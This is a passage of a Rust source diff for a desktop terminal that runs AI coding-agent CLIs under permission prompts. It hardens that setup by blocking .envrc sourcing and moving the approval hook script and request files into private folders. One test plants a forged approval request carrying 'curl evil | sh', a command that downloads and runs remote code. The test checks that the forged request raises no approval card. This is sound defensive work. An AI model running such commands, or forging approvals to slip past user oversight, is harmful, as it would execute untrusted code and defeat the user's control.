+        "{append_cmd}; printf '{{\"state\":\"{state}\",\"run_id\":\"%s\"}}\\n' \"${{DESIGNOS_AGENT_RUN_ID:-}}\" > {}",
+        crate::agent_turn_status::sh_single_quote(&status_path.display().to_string())
+    )
 }
 
 fn command_handler_group(command: String, capture_command: Option<&str>) -> serde_json::Value {
@@ -4694,21 +4953,12 @@ fn session_hooks_settings_with_approval(
     let prompt = match context_replies {
         Some((page_reply, boot_reply, marker)) => {
             let compact_reply = boot_reply.with_file_name("bootstrap-compact-reply.json");
+            let quoted = |path: &Path| crate::agent_turn_status::sh_single_quote(&path.display().to_string());
+            let (marker, boot, compact, page) = (quoted(marker), quoted(boot_reply), quoted(&compact_reply), quoted(page_reply));
             format!(
-                "{}; {}; if [ ! -e '{}' ]; then i=0; while [ ! -f '{}' ] && [ $i -lt 5 ]; do sleep 0.1; i=$((i+1)); done; fi; if [ ! -e '{}' ] && [ -f '{}' ]; then : > '{}'; cat '{}'; elif [ ! -e '{}' ] && [ -f '{}' ]; then : > '{}'; cat '{}'; else cat '{}'; fi",
+                "{}; {}; if [ ! -e {marker} ]; then i=0; while [ ! -f {boot} ] && [ $i -lt 5 ]; do sleep 0.1; i=$((i+1)); done; fi; if [ ! -e {marker} ] && [ -f {boot} ]; then : > {marker}; cat {boot}; elif [ ! -e {marker} ] && [ -f {compact} ]; then : > {marker}; cat {compact}; else cat {page}; fi",
                 status_hook_command(status_path, "UserPromptSubmit", "working"),
                 start_mark,
-                marker.display(),
-                boot_reply.display(),
-                marker.display(),
-                boot_reply.display(),
-                marker.display(),
-                boot_reply.display(),
-                marker.display(),
-                compact_reply.display(),
-                marker.display(),
-                compact_reply.display(),
-                page_reply.display()
             )
         }
         None => format!("{}; {}", status_hook_command(status_path, "UserPromptSubmit", "working"), start_mark),
@@ -4827,6 +5077,31 @@ pub fn configure_pty_env_with_session(cmd: &mut CommandBuilder, preset: AgentCli
         // cwd is Studio's own session dir, so skip the prompt for this process instead of writing
         // `~/.grok/trusted_folders.toml`.
         cmd.env("GROK_FOLDER_TRUST", "0");
+        // With the trust prompt off, Grok also sources `<cwd>/.envrc` with bash when a session starts. A zero turns every `.envrc`
+        // evaluation off, in Ask and Skip mode alike: a session folder never holds an `.envrc` the user wrote, and an agent may.
+        cmd.env("GROK_ENVRC_TIMEOUT_SECS", "0");
+    }
+    // The Ask launch names these three variables, and Claude reads an empty `--settings` as no settings and an empty
+    // `--plugin-dir` as its own working folder. So an Ask tab always gets non-empty values (a private file or plugin, or
+    // values that name nothing). A tab without a session takes the Ask command as its safety net, so it gets the values
+    // that name nothing. A Skip tab names none of the variables, and a value Studio's own environment held must not reach it.
+    let (mcp_config, settings, plugin) = match session {
+        Some(sess) => (sess.claude_mcp_config.as_deref(), sess.claude_settings.as_deref(), sess.claude_plugin.as_deref()),
+        None => (
+            Some(crate::agent_permissions::NO_CLAUDE_MCP_CONFIG),
+            Some(crate::agent_permissions::NO_CLAUDE_SETTINGS),
+            Some(crate::agent_permissions::NO_CLAUDE_PLUGIN_DIR),
+        ),
+    };
+    for (name, value) in [
+        (crate::agent_permissions::CLAUDE_MCP_CONFIG_ENV, mcp_config),
+        (crate::agent_permissions::CLAUDE_SETTINGS_ENV, settings),
+        (crate::agent_permissions::CLAUDE_PLUGIN_ENV, plugin),
+    ] {
+        match value {
+            Some(value) => cmd.env(name, value),
+            None => cmd.env_remove(name),
+        }
     }
 
     if let Some(sess) = session {
@@ -4844,13 +5119,17 @@ pub fn configure_pty_env_with_session(cmd: &mut CommandBuilder, preset: AgentCli
         cmd.env("DESIGNOS_DOC_NAME", &sess.doc_name);
         if preset == AgentCliPreset::Gemini {
             cmd.env("GEMINI_CLI_TRUSTED_FOLDERS_PATH", sess.session_dir.join(".gemini").join("trustedFolders.json").as_os_str());
+            // The variable is Gemini's own, so a value the user or an admin set stays when Studio has no file to name.
+            if let Some(defaults) = sess.gemini_system_defaults.as_deref() {
+                cmd.env(crate::gemini_status_hooks::SYSTEM_DEFAULTS_ENV, defaults);
+            }
         }
         if let Some(tab_uuid) = sess.tab_session_uuid.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
             cmd.env("DESIGNOS_TAB_SESSION_UUID", tab_uuid);
         }
     } else {
         cmd.env("DESIGNOS_AGENT_RUN_ID", format!("p{}-tab-1-1-1", std::process::id()));
-        let fallback_dir = std::env::temp_dir().join("designos-sessions").join(tab_session_id(&format!("p{}", std::process::id()), 1));
+        let fallback_dir = crate::agent_session_files::ephemeral_session_dir(&tab_session_id(&format!("p{}", std::process::id()), 1));
         cmd.env("DESIGNOS_LIVE_SPEC", fallback_dir.join("live-spec.json").as_os_str());
         cmd.env("DESIGNOS_SELECTION_JSON", fallback_dir.join("selection.spec.json").as_os_str());
     }
@@ -4870,6 +5149,15 @@ pub fn configure_pty_env_with_session(cmd: &mut CommandBuilder, preset: AgentCli
     #[cfg(test)]
     if let Some(overrides) = session.and_then(|s| s.path_override.as_ref()) {
         cmd.env("PATH", overrides);
+        return;
+    }
+    // A test's agent tab finds no real agent CLI: it gets the stubs the test put in `path_prepend`, then the test process's own `PATH`
+    // without any folder that holds an agent CLI (the user's `~/.local/bin`, Homebrew's, and so on). The runner's own tools, a stub's
+    // `python3` and `sh`, stay where the runner has them.
+    #[cfg(test)]
+    if !matches!(preset, AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp) {
+        let prepend = session.map(|s| s.path_prepend.as_slice()).unwrap_or_default();
+        cmd.env("PATH", crate::test_agent_path::test_agent_path(prepend, std::env::var_os("PATH")));
         return;
     }
     if std::env::var_os("PATH").is_some_and(|p| p.is_empty()) {
@@ -4944,7 +5232,8 @@ pub fn export_selection_and_comments_to_pty(
         );
     }
     let json = serde_json::to_string_pretty(&json_value).map_err(|e| e.to_string())?;
-    atomic_write_session_file(&state.selection_spec_path, json.as_bytes()).map_err(|e| format!("write {}: {e}", state.selection_spec_path.display()))?;
+    atomic_write_session_file(&state.selection_spec_path, json.as_bytes())
+        .map_err(|e| format!("write {}: {}", state.selection_spec_path.display(), crate::agent_session_files::with_next_step(&e)))?;
 
     let cmd_snippet =
         format!("Read the design:os selection at {} (node spec plus open pin-comments under \"designos_context\").", state.selection_spec_path.display());
@@ -5747,6 +6036,10 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
         {
             let bracketed_paste = tab.parser.lock().ok().map(|pg| pg.screen().bracketed_paste()).unwrap_or(false);
             let mut raw_bytes: Vec<u8> = Vec::new();
+            // Set when a key that can answer Gemini CLI's confirmation dialog is among them: Enter, Esc, Ctrl+C or an option number
+            // (`ToolConfirmationMessage.tsx:185-196`, `useSelectionList.ts:411-461`, `AppContainer.tsx:1695-1701` in 0.35.3). It never
+            // ends a wait; the dialog on screen does (`gemini_dialog`).
+            let mut answers_gemini_dialog = false;
             let mut copy_selection = false;
             let mut select_all = false;
             let mut clear_scrollback = false;
@@ -5767,6 +6060,7 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
                             if !i.modifiers.command && !i.modifiers.ctrl && !i.modifiers.alt && text != "\n" && text != "\r" {
                                 tab.input_line_buffer.push_str(text);
                                 raw_bytes.extend_from_slice(text.as_bytes());
+                                answers_gemini_dialog |= matches!(text.as_bytes(), [b'1'..=b'5']);
                             }
                         }
                         Event::Key { key, pressed: true, modifiers, .. } => {
@@ -5809,6 +6103,7 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
                                         } else {
                                             tab.input_line_buffer.clear();
                                             raw_bytes.push(0x03);
+                                            answers_gemini_dialog = true;
                                         }
                                     }
                                     Key::D => raw_bytes.push(0x04),
@@ -5837,6 +6132,7 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
                                         tab.input_line_buffer.clear();
                                         tab.clear_session_failure();
                                         raw_bytes.push(b'\r');
+                                        answers_gemini_dialog = true;
                                     }
                                     Key::Backspace => {
                                         let _ = tab.input_line_buffer.pop();
@@ -5848,6 +6144,7 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
                                             close_search = true;
                                         } else {
                                             raw_bytes.push(0x1b);
+                                            answers_gemini_dialog = true;
                                         }
                                     }
                                     Key::ArrowUp => raw_bytes.extend_from_slice(b"\x1b[A"),
@@ -5889,6 +6186,9 @@ fn render_vt100_viewport(state: &mut TerminalState, ui: &mut Ui, viewport_rect: 
                     pg.set_scrollback(0);
                 }
                 tab.write_bytes(&raw_bytes);
+                if answers_gemini_dialog {
+                    tab.note_gemini_key();
+                }
             }
         }
 
@@ -6215,6 +6515,42 @@ fn ansi_256_to_color32(idx: u8) -> Color32 {
 
 #[cfg(test)]
 mod ask_mode_tests;
+
+#[cfg(all(test, unix))]
+mod ask_hooks_tests;
+
+#[cfg(all(test, unix))]
+mod ask_launch_sources_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_status_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_test_support;
+
+#[cfg(all(test, unix))]
+mod gemini_launch_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_wait_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_dialog_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_composer_tests;
+
+#[cfg(all(test, unix))]
+mod delayed_enter_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_narrow_tests;
+
+#[cfg(all(test, unix))]
+mod gemini_range_tests;
+
+#[cfg(all(test, unix))]
+mod real_cli_launch_tests;
 
 #[cfg(test)]
 mod tests {
@@ -6682,7 +7018,7 @@ mod tests {
         assert!(st1.context_json_path.exists());
         assert!(st1.live_canvas_path.exists());
         assert!(st1.session_dir.join("mcp-config.json").exists());
-        assert!(st1.session_dir.join("hooks.json").exists());
+        assert!(crate::agent_permissions::claude_hooks_path(&st1).exists());
         assert!(st1.session_dir.join("SKILL.md").exists());
 
         let ctx_val: serde_json::Value =
@@ -7501,6 +7837,29 @@ mod tests {
         assert_eq!(grok_env(AgentCliPreset::Antigravity), None);
     }
 
+    /// Grok sources `<cwd>/.envrc` with bash when a session starts, unless `GROK_ENVRC_TIMEOUT_SECS` is `0`. A zero turns every load
+    /// off, so it also covers a file an agent writes after the start check; Skip mode has no use for `.envrc` either.
+    #[test]
+    fn grok_pty_env_turns_envrc_loading_off_for_grok_tabs_in_every_mode_and_for_no_other_cli() {
+        let envrc = |preset, session: Option<&SessionEnv>| {
+            let mut cmd = CommandBuilder::new("true");
+            // A value Studio's own environment held must not reach a Grok tab.
+            cmd.env("GROK_ENVRC_TIMEOUT_SECS", "10");
+            configure_pty_env_with_session(&mut cmd, preset, None, session);
+            cmd.get_env("GROK_ENVRC_TIMEOUT_SECS").map(|v| v.to_string_lossy().into_owned())
+        };
+        let mut st = isolated_683_state(734);
+        for mode in [PermissionMode::Ask, PermissionMode::Skip] {
+            st.permission_mode = mode;
+            let env = st.session_env();
+            assert_eq!(envrc(AgentCliPreset::Grok, Some(&env)).as_deref(), Some("0"), "{mode:?}");
+            for other in [AgentCliPreset::Claude, AgentCliPreset::Antigravity, AgentCliPreset::Gemini, AgentCliPreset::Codex] {
+                assert_eq!(envrc(other, Some(&env)).as_deref(), Some("10"), "{other:?} keeps what Studio's own environment held ({mode:?})");
+            }
+        }
+        assert_eq!(envrc(AgentCliPreset::Grok, None).as_deref(), Some("0"), "a tab without a session");
+    }
+
     /// Quoted items of the TOML list that follows `key=[` in a Codex `-c` override.
     fn codex_list_override(launch: &str, key: &str) -> Vec<String> {
         let start = launch.find(&format!("{key}=[")).unwrap_or_else(|| panic!("no {key} override in: {launch}")) + key.len() + 2;
@@ -7597,7 +7956,9 @@ mod tests {
         st.flush_live_sync();
         for rel in ["SKILL.md", ".claude/skills/designos-studio/SKILL.md", ".agents/skills/designos-studio/SKILL.md", "AGENTS.md"] {
             let text = std::fs::read_to_string(st.session_dir.join(rel)).unwrap_or_else(|e| panic!("{rel}: {e}"));
-            assert!(text.contains("designos-studio") && text.contains("Skill Layout File"), "{rel}: {text}");
+            // Each CLI loads this file by itself, so it names the open file through `$DESIGNOS_DOC_NAME` and not by its name.
+            assert!(text.contains("designos-studio") && text.contains("`$DESIGNOS_DOC_NAME`"), "{rel}: {text}");
+            assert!(!text.contains("Skill Layout File"), "{rel} carries the document name: {text}");
             assert!(text.ends_with(designos_mcp::rules::GENERATED_RULES_MD.trim_start()), "{rel} must include the generated rules pack");
         }
     }
@@ -7702,14 +8063,20 @@ mod tests {
 
     #[test]
     fn claude_hooks_file_is_a_valid_settings_file_and_the_launch_loads_it() {
+        // Skip mode loads the file in the session folder; Ask mode loads the private one (`ask_hooks_tests`).
         assert!(
             AgentCliPreset::Claude.cli_launch_command().contains("--settings \"$DESIGNOS_SESSION_DIR/hooks.json\""),
             "{}",
             AgentCliPreset::Claude.cli_launch_command()
         );
+        assert!(
+            AgentCliPreset::Claude.cli_launch_command_for_mode(PermissionMode::Ask).contains("--settings \"$DESIGNOS_CLAUDE_SETTINGS\""),
+            "{}",
+            AgentCliPreset::Claude.cli_launch_command_for_mode(PermissionMode::Ask)
+        );
 
         let st = provisioned_session(741);
-        let settings = read_json(&st.session_dir.join("hooks.json"));
+        let settings = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let top: Vec<&String> = settings.as_object().unwrap().keys().collect();
         assert_eq!(top, vec!["hooks"], "a --settings file takes Claude's settings keys only");
         let hooks = settings["hooks"].as_object().unwrap();
@@ -7724,7 +8091,7 @@ mod tests {
     #[test]
     fn session_hooks_drive_agent_status_from_working_to_done_in_every_supported_cli() {
         let st = provisioned_session(742);
-        let claude = read_json(&st.session_dir.join("hooks.json"));
+        let claude = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let grok = read_json(&st.session_dir.join(".grok").join("hooks").join("designos-status.json"));
         assert_eq!(
             claude["hooks"].as_object().unwrap().keys().collect::<Vec<_>>(),
@@ -7766,7 +8133,7 @@ mod tests {
         assert_eq!(run_hook_command(&prompt_command(&grok)), "", "a Grok prompt hook must not print");
 
         // Claude reads `hookSpecificOutput.additionalContext`: the page, never the selection.
-        let claude = read_json(&st.session_dir.join("hooks.json"));
+        let claude = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let printed = run_hook_command(&prompt_command(&claude));
         let reply: serde_json::Value = serde_json::from_str(printed.trim()).expect("Claude hook prints decision json");
         let out = &reply["hookSpecificOutput"];
@@ -8619,7 +8986,7 @@ mod tests {
                 log.push_str("Error: 429 rate_limit_error: Rate limit reached. Resets at 14:30\n");
             }
         }
-        let claude_hooks = read_json(&st.session_dir.join("hooks.json"));
+        let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let stop_failure_cmd = claude_hooks["hooks"]["StopFailure"][0]["hooks"][0]["command"].as_str().expect("StopFailure hook command").to_string();
         run_hook_command(&stop_failure_cmd);
         let _ = st.poll_live_agent_bridge();
@@ -8743,6 +9110,31 @@ mod tests {
         assert_eq!(home_before, home_after, "$HOME/.gemini/settings.json must never be modified by Studio");
     }
 
+    /// `gemini mcp list` in `session_dir`, as the live check runs it, against a scratch home so that it never writes to the
+    /// user's `~/.gemini` (Gemini's project registry and login live there). The placeholder key only satisfies the auth check
+    /// that comes before the listing: nothing logs in, and no model is called.
+    fn gemini_mcp_list_command(session_dir: &Path, trusted_path: &Path) -> std::process::Command {
+        let mut list_cmd = std::process::Command::new("gemini");
+        list_cmd.args(["mcp", "list"]).current_dir(session_dir).env("GEMINI_CLI_TRUSTED_FOLDERS_PATH", trusted_path);
+        crate::scratch_cli_home::isolate_cli_homes(&mut list_cmd);
+        list_cmd.env("GEMINI_API_KEY", "placeholder-not-a-key");
+        list_cmd
+    }
+
+    #[test]
+    fn the_live_check_of_gemini_uses_a_scratch_home() {
+        let session = std::env::temp_dir().join("designos-live-check-session");
+        let cmd = gemini_mcp_list_command(&session, &session.join(".gemini").join("trustedFolders.json"));
+        let env = |name: &str| cmd.get_envs().find(|(key, _)| *key == name).and_then(|(_, value)| value).map(PathBuf::from);
+        let home = env("GEMINI_CLI_HOME").expect("Gemini's home folder is moved off the user's");
+        assert_eq!(env("HOME").as_deref(), Some(home.as_path()), "anything that asks the OS for the home gets the scratch one too");
+        assert!(home.starts_with(std::env::temp_dir()), "{}", home.display());
+        assert!(std::env::var_os("HOME").is_none_or(|real| !home.starts_with(real)), "the scratch home sits inside the real one");
+        assert!(home.join(".gemini").join("settings.json").is_file(), "the scratch home carries the auth type `gemini mcp list` checks");
+        assert!(env("GEMINI_API_KEY").is_some(), "a placeholder key satisfies that check; no login happens");
+        assert!(cmd.get_args().eq(["mcp", "list"]) && cmd.get_current_dir() == Some(session.as_path()));
+    }
+
     #[test]
     fn gemini_live_check() {
         let mut st = isolated_683_state(780);
@@ -8769,9 +9161,7 @@ mod tests {
         assert!(argv.windows(2).any(|w| w == ["--", "--workspace"]), "must separate --workspace with --: {argv:?}");
 
         if runtime_binary_available("gemini") {
-            let mut list_cmd = std::process::Command::new("gemini");
-            list_cmd.args(["mcp", "list"]).current_dir(&st.session_dir).env("GEMINI_CLI_TRUSTED_FOLDERS_PATH", &trusted_path);
-            if let Ok(out) = list_cmd.output() {
+            if let Ok(out) = gemini_mcp_list_command(&st.session_dir, &trusted_path).output() {
                 let combined = format!("{}\n{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr));
                 assert!(combined.contains("designos:"), "gemini mcp list must discover the session-scoped designos server: {combined}");
             }
@@ -8820,10 +9210,15 @@ mod tests {
 
     /// A terminal state on a cleared session folder, which is removed again when the test ends (see [`ScopedTerminalState`]).
     fn isolated_683_state(tab_id: u64) -> ScopedTerminalState {
-        let dir = std::env::temp_dir().join("designos-sessions").join(tab_session_id(&format!("p{}", std::process::id()), tab_id));
+        let dir = crate::agent_session_files::ephemeral_session_dir(&tab_session_id(&format!("p{}", std::process::id()), tab_id));
         let _ = std::fs::remove_dir_all(&dir);
         let _ = std::fs::create_dir_all(&dir);
         ScopedTerminalState::new(TerminalState::for_tab(tab_id))
+    }
+
+    /// The private approvals folder of tab `idx`.
+    fn tab_approvals_of(st: &TerminalState, idx: usize) -> PathBuf {
+        st.tabs[idx].approvals_dir.clone().expect("a session tab has a private approvals folder")
     }
 
     fn spawn_mock_agent_tab(st: &mut TerminalState, preset: AgentCliPreset, session_uuid: Option<&str>) -> usize {
@@ -8927,18 +9322,20 @@ mod tests {
     #[test]
     fn receipt_shows_exact_duration_and_counts() {
         let mut tracker = crate::agent_turn_status::TabTurnTracker::default();
-        let submit = crate::agent_turn_status::AgentEventRecord { t: 100.0, e: "UserPromptSubmit".to_string(), p: serde_json::json!({"session_id": "s1"}) };
+        let submit =
+            crate::agent_turn_status::AgentEventRecord { t: 100.0, e: "UserPromptSubmit".to_string(), tab: None, p: serde_json::json!({"session_id": "s1"}) };
         let _ = tracker.on_event(&submit);
         for i in 0..12 {
             let pre = crate::agent_turn_status::AgentEventRecord {
                 t: 101.0 + f64::from(i),
                 e: "PreToolUse".to_string(),
+                tab: None,
                 p: serde_json::json!({"session_id": "s1", "tool_name": "designos_update_node"}),
             };
             let _ = tracker.on_event(&pre);
         }
         tracker.record_touched_layers([1, 2, 3, 4, 5, 6, 7]);
-        let stop = crate::agent_turn_status::AgentEventRecord { t: 180.0, e: "Stop".to_string(), p: serde_json::json!({"session_id": "s1"}) };
+        let stop = crate::agent_turn_status::AgentEventRecord { t: 180.0, e: "Stop".to_string(), tab: None, p: serde_json::json!({"session_id": "s1"}) };
         let eff = tracker.on_event(&stop);
         let receipt = eff.receipt.expect("receipt emitted on Stop");
         assert_eq!(receipt.format_line(), "Worked for 1m 20s · 12 tool calls · 7 layers changed");
@@ -8955,10 +9352,15 @@ mod tests {
     #[test]
     fn no_count_is_invented_without_data() {
         let mut tracker = crate::agent_turn_status::TabTurnTracker::default();
-        let _ = tracker.on_event(&crate::agent_turn_status::AgentEventRecord { t: 10.0, e: "UserPromptSubmit".to_string(), p: serde_json::json!({}) });
         let _ =
-            tracker.on_event(&crate::agent_turn_status::AgentEventRecord { t: 11.0, e: "PreToolUse".to_string(), p: serde_json::json!({"tool_name": "Read"}) });
-        let eff = tracker.on_event(&crate::agent_turn_status::AgentEventRecord { t: 15.0, e: "Stop".to_string(), p: serde_json::json!({}) });
+            tracker.on_event(&crate::agent_turn_status::AgentEventRecord { t: 10.0, e: "UserPromptSubmit".to_string(), tab: None, p: serde_json::json!({}) });
+        let _ = tracker.on_event(&crate::agent_turn_status::AgentEventRecord {
+            t: 11.0,
+            e: "PreToolUse".to_string(),
+            tab: None,
+            p: serde_json::json!({"tool_name": "Read"}),
+        });
+        let eff = tracker.on_event(&crate::agent_turn_status::AgentEventRecord { t: 15.0, e: "Stop".to_string(), tab: None, p: serde_json::json!({}) });
         let receipt = eff.receipt.expect("receipt emitted");
         assert_eq!(receipt.layers_changed, None);
         let line = receipt.format_line();
@@ -9158,7 +9560,10 @@ mod tests {
                 let raw = std::fs::read_to_string(st.session_dir.join(rel)).unwrap_or_else(|e| panic!("{rel}: {e}"));
                 serde_json::from_str(&raw).unwrap_or_else(|e| panic!("{rel} is not JSON: {e}"))
             };
-            let claude = read("hooks.json");
+            let claude: serde_json::Value = {
+                let path = crate::agent_permissions::claude_hooks_path(&st);
+                serde_json::from_str(&std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("{}: {e}", path.display()))).expect("hooks are JSON")
+            };
             let grok = read(".grok/hooks/designos-status.json");
             assert!(claude.get("permissions").is_none(), "hooks.json must never set permissions.allow: {claude}");
 
@@ -9204,14 +9609,56 @@ mod tests {
                 assert_eq!(claude_permission.len(), 2, "Claude PermissionRequest = status handler + approval handler: {claude_permission:?}");
                 assert_eq!(approve.len(), 1);
                 assert_eq!(approve[0]["timeout"].as_u64(), Some(crate::agent_permissions::APPROVAL_HOOK_TIMEOUT_SECS));
-                assert!(st.session_dir.join("approve-hook.sh").is_file(), "approve-hook.sh must be written for the hook to run");
+                let script = crate::agent_approval_channel::hook_script_path(&st.session_dir).expect("a private channel folder");
+                assert!(script.is_file(), "approve-hook.sh must be written for the hook to run");
+                assert_eq!(approve[0]["command"].as_str(), crate::agent_permissions::approval_hook_handler(&script)["command"].as_str());
+                assert!(!st.session_dir.join("approve-hook.sh").exists(), "the hook must not sit in the folder the agent can write");
             } else {
                 assert_eq!(claude_permission.len(), 1, "Skip mode keeps only the status handler: {claude_permission:?}");
                 assert!(approve.is_empty(), "Skip mode must not install the approval hook");
+                let channel = crate::agent_approval_channel::channel_dir(&st.session_dir).expect("a private channel location");
+                assert!(!channel.exists(), "Skip mode creates no approval channel: {}", channel.display());
             }
             assert_eq!(hook_handlers(&grok, "PermissionRequest").len(), 1, "Grok never runs the Claude approval script");
+            crate::agent_approval_channel::remove_channel(&st.session_dir);
             let _ = std::fs::remove_dir_all(&st.session_dir);
         }
+    }
+
+    /// The approval channel is the session's: closing one tab withdraws that tab's requests and keeps the others, and the
+    /// whole private folder goes when the session shuts down or moves to another folder.
+    #[test]
+    fn the_private_channel_goes_with_the_session() {
+        let mut st = isolated_683_state(68414);
+        st.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
+        let first = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-channel-1"));
+        let second = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-channel-2"));
+        let script = crate::agent_permissions::write_approval_hook_script(&st.session_dir).expect("install the hook");
+        let channel = crate::agent_approval_channel::channel_dir(&st.session_dir).unwrap();
+        let (first_dir, second_dir) = (tab_approvals_of(&st, first), tab_approvals_of(&st, second));
+        for (dir, id) in [(&first_dir, "8001-Bash"), (&second_dir, "8002-Bash")] {
+            crate::agent_approval_channel::create_private_dir_all(dir).unwrap();
+            let request = serde_json::json!({ "id": id, "tool_name": "Bash", "summary": "ls", "timestamp": crate::agent_sessions::unix_timestamp_secs() });
+            std::fs::write(dir.join(format!("{id}.request.json")), request.to_string()).unwrap();
+        }
+
+        st.close_tab(first);
+        assert_eq!(std::fs::read_to_string(first_dir.join("8001-Bash.answer")).unwrap().trim(), "withdrawn", "the closed tab's request is withdrawn");
+        assert!(!second_dir.join("8002-Bash.answer").exists(), "the other tab's request is left alone");
+        assert!(script.is_file() && channel.is_dir(), "a tab is still running: the channel stays");
+
+        st.shutdown();
+        assert!(!channel.exists(), "shutting the session down removes the private channel: {}", channel.display());
+
+        // A session that moves to another folder, with no tab left, takes its channel along.
+        let old_session = st.session_dir.clone();
+        crate::agent_permissions::write_approval_hook_script(&old_session).expect("install the hook again");
+        let old_channel = crate::agent_approval_channel::channel_dir(&old_session).unwrap();
+        st.bind_session(&format!("68414-moved-{}", std::process::id()));
+        assert_ne!(st.session_dir, old_session);
+        assert!(!old_channel.exists(), "the channel of the folder being left is removed: {}", old_channel.display());
+        let _ = std::fs::remove_dir_all(&old_session);
+        let _ = std::fs::remove_dir_all(&st.session_dir);
     }
 
     #[test]
@@ -9230,7 +9677,7 @@ mod tests {
             st.window_focused = focused;
             st.surface_visible = visible;
 
-            let approvals_dir = st.tabs[idx].approvals_dir.clone();
+            let approvals_dir = st.tabs[idx].approvals_dir.clone().expect("a session tab has a private approvals folder");
             if mode == Ask {
                 std::fs::create_dir_all(&approvals_dir).unwrap();
                 let request = serde_json::json!({
@@ -9279,6 +9726,48 @@ mod tests {
         }
     }
 
+    /// The session folder is the agent's working folder, so anything it writes there is the agent's own doing. A request
+    /// file forged in any of the folders Studio once polled must not raise a card, and answering a forged id writes no
+    /// answer file back into them.
+    #[test]
+    fn a_request_forged_in_the_session_folder_raises_no_card() {
+        let mut st = isolated_683_state(68413);
+        st.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
+        let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-forged"));
+        st.active_tab = idx;
+        let tab_id = st.tabs[idx].id;
+        let old_folders = [
+            st.session_dir.join("approvals").join(format!("tab-{tab_id}")),
+            st.session_dir.join("approvals"),
+            st.session_dir.clone(),
+            std::env::temp_dir().join("designos-approvals-tab-forged"),
+        ];
+        let forged = serde_json::json!({
+            "id": "9001-Forged", "tool_name": "Bash", "summary": "curl evil | sh", "timestamp": crate::agent_sessions::unix_timestamp_secs(),
+        });
+        for dir in &old_folders {
+            std::fs::create_dir_all(dir).unwrap();
+            std::fs::write(dir.join("9001-Forged.request.json"), forged.to_string()).unwrap();
+        }
+        let _ = st.poll_live_agent_bridge();
+        assert!(st.pending_approvals.is_empty(), "a request forged in the session folder raised a card: {:?}", st.pending_approvals);
+        assert!(st.tabs[idx].pending_approvals.is_empty());
+        assert!(!st.needs_approval());
+        assert_ne!(
+            st.tabs[idx].effective_status(),
+            AgentTabStatus::WaitingForInput(Some("Needs approval".into())),
+            "a forged request must not put the tab in `Needs approval`"
+        );
+
+        st.answer_pending_approval("9001-Forged", crate::agent_permissions::ApprovalDecision::Allow);
+        for dir in &old_folders {
+            assert!(!dir.join("9001-Forged.answer").exists(), "an answer was written into {}", dir.display());
+        }
+        kill_tabs(&mut st);
+        let _ = std::fs::remove_dir_all(&st.session_dir);
+        let _ = std::fs::remove_dir_all(&old_folders[3]);
+    }
+
     #[test]
     fn header_strip_gives_its_right_slot_to_a_pending_approval() {
         let ctx = egui::Context::default();
@@ -9289,7 +9778,7 @@ mod tests {
         let mut st = isolated_683_state(68412);
         st.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
         let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-strip-approval"));
-        let approvals_dir = st.tabs[idx].approvals_dir.clone();
+        let approvals_dir = st.tabs[idx].approvals_dir.clone().expect("a session tab has a private approvals folder");
         std::fs::create_dir_all(&approvals_dir).unwrap();
         let request = serde_json::json!({
             "id": "6001-Bash", "tool_name": "Bash", "summary": "cargo check", "timestamp": crate::agent_sessions::unix_timestamp_secs(),
@@ -9499,7 +9988,7 @@ mod tests {
         let mut st = isolated_683_state(69413);
         st.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
         let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-stack"));
-        let approvals_dir = st.tabs[idx].approvals_dir.clone();
+        let approvals_dir = st.tabs[idx].approvals_dir.clone().expect("a session tab has a private approvals folder");
         std::fs::create_dir_all(&approvals_dir).unwrap();
         let events_path = st.session_dir.join("agent-events.jsonl");
         // Turn 1 finished (receipt row), turn 2 is waiting on a permission request (approval card).
@@ -9936,8 +10425,8 @@ mod tests {
             tab.title = "Claude CLI #1".into();
         }
 
-        let approvals_dir = crate::agent_permissions::approvals_dir(&st.session_dir);
-        std::fs::create_dir_all(&approvals_dir).unwrap();
+        let approvals_dir = st.active_tab().and_then(|tab| tab.approvals_dir.clone()).expect("a session tab has a private approvals folder");
+        crate::agent_approval_channel::create_private_dir_all(&approvals_dir).unwrap();
         let now = crate::agent_sessions::unix_timestamp_secs();
 
         // 1. Write a request and verify the approval card surfaces and clicking Approve writes "allow"
@@ -10117,8 +10606,8 @@ mod tests {
             tab.preset = AgentCliPreset::Claude;
         }
 
-        let approvals_dir = crate::agent_permissions::approvals_dir(&st.session_dir);
-        std::fs::create_dir_all(&approvals_dir).unwrap();
+        let approvals_dir = st.active_tab().and_then(|tab| tab.approvals_dir.clone()).expect("a session tab has a private approvals folder");
+        crate::agent_approval_channel::create_private_dir_all(&approvals_dir).unwrap();
         let req = serde_json::json!({
             "id": "3001-Bash",
             "tool_name": "Bash",
@@ -10199,8 +10688,8 @@ mod tests {
                 tab.id
             })
             .expect("tab 1 exists");
-        let tab1_approvals_dir = crate::agent_permissions::tab_approvals_dir(&st.session_dir, tab1_id);
